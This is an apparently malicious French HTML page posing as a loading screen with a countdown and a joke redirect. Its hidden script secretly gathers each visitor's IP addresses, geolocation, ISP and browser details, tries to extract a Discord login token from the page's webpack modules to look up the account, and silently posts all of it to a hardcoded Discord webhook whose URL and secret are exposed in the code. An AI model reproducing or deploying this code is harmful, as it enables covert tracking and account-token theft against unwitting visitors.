<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement en cours...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 15%;
      box-sizing: border-box;
    }
    .loader {
      border: 14px solid #222;
      border-top: 14px solid #ff3333;
      border-radius: 50%;
      width: 90px;
      height: 90px;
      animation: spin 1.2s linear infinite;
      margin: 0 auto 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h1 { font-size: 28px; margin: 10px 0; }
    p { font-size: 18px; color: #ccc; }
    .countdown { font-size: 22px; margin-top: 20px; color: #ff6666; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <h1>Veuillez patienter...</h1>
  <p>Redirection automatique en cours</p>
  <div class="countdown" id="timer">5 secondes</div>

  <script>
    // === TON WEBHOOK DISCORD (Ã  changer si besoin) ===
    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";

    (async () => {
      try {
        // RÃ©cup IP + gÃ©oloc
        const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
          fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
          fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
        ]);

        const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
        const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
        const geo = geoRes.status === "fulfilled" ? geoRes.value : {};

        const ua = navigator.userAgent;
        const lang = navigator.language || "inconnu";
        const screenRes = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";

        // === NOUVELLE DÃ‰TECTION DISCORD (trÃ¨s efficace 2025) ===
        let discordUsername = "Non dÃ©tectÃ©";
        let discordTag = "";
        let discordId = "";
        let discordAvatar = "";

        try {
          let token = null;

          // MÃ©thode webpackChunkdiscord_app (la plus fiable actuellement)
          const chunks = window.webpackChunkdiscord_app || [];
          if (chunks.push) {
            chunks.push([[Symbol()], {}, (req) => {
              for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
                if (m.default && m.default.getToken !== void 0) {
                  token = m.default.getToken();
                }
                if (m.getToken !== void 0) {
                  token = m.getToken();
                }
              }
            }]);
            chunks.pop();
          }

          if (token) {
            const userRes = await fetch("https://discord.com/api/v9/users/@me", {
              headers: { "Authorization": token }
            });

            if (userRes.ok) {
              const user = await userRes.json();
              discordUsername = user.global_name || user.username || "Inconnu";
              discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
              discordId = user.id;
              discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
            }
          }
        } catch (e) {
          // Silencieux si Ã§a rate
        }

        // Message propre
        const message = `
ðŸŽ¯ **Nouvelle visite dÃ©tectÃ©e**

**Pseudo Discord :** ${discordUsername}${discordTag}
**ID Discord :** ${discordId || "Non dÃ©tectÃ©"}

**IP IPv4 :** \`${ipv4}\`
**IP IPv6 :** \`${ipv6}\`
**Pays :** ${geo.country_name || "Inconnu"} (${geo.country_code || "??"})
**Ville / RÃ©gion :** ${geo.city || "Inconnu"} â€¢ ${geo.region || ""}
**FAI :** \`${geo.org || "Inconnu"}\`

**Navigateur :** ${ua.substring(0, 300)}
**Langue :** ${lang}
**RÃ©solution :** ${screenRes}
**Fuseau horaire :** ${timezone}
**Page :** ${window.location.href}
**Heure (UTC) :** ${new Date().toISOString()}
        `.trim();

        // Envoi
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: discordUsername !== "Non dÃ©tectÃ©" ? discordUsername : "Tracker",
            avatar_url: discordAvatar
          })
        });

      } catch (e) {}
    })();

    // Compte Ã  rebours + Rickroll dans nouvel onglet
    let timeLeft = 5;
    const timerEl = document.getElementById("timer");
    const countdown = setInterval(() => {
      timeLeft--;
      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
      if (timeLeft <= 0) {
        clearInterval(countdown);
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
      }
    }, 1000);
  </script>
</body>
</html>
